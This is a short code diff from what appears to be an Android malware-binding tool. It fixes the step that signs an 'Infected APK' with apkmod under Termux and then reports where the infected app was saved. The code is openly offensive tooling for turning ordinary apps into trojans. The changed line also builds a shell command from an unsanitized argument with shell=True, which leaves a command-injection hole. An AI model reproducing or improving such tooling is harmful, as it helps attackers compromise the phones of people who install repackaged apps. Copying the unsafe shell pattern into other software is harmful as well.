@@ -301,7 +301,7 @@ def Bind():
 			os.chdir('../')
 		print(CYAN + '[+] Signing Infected APK...\n' + WHITE)
 		if Termux_Bool:
-			subprocess.call("apkmod -s TempP/fin_out.apk %s" % (str(sys.argv[3])))
+			subprocess.call("apkmod -s TempP/fin_out.apk %s" % (str(sys.argv[3])),shell=True)
 			print ( GREEN + "\nInfected app saved :  " + YELLOW + " %s (%s bytes)" % (str(sys.argv[3]),str(os.path.getsize(str(sys.argv[3])))) + WHITE)	
 			subprocess.call(rm + " TempP",shell=True)
 			exit()
